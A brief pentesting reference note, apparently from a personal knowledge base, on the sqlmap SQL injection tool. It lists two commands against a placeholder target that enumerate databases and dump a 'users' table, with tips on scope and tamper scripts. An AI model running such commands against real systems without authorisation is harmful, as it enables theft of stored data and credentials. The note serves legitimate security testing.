---
title: "sqlmap"
type: tool-note
tool: sqlmap
tags: [tool, pentesting, web]
cssclass: cs-note
---

# sqlmap

## Objective
Detect and exploit SQL injection flaws safely.

## Common Commands
```bash
sqlmap -u "http://target/page?id=1" --batch --dbs
sqlmap -u "http://target/page?id=1" -D db -T users --dump --batch
```

## Notes
Always validate scope; use tamper scripts if needed. Prefer read-only extraction in tests.

## References
- https://sqlmap.org/


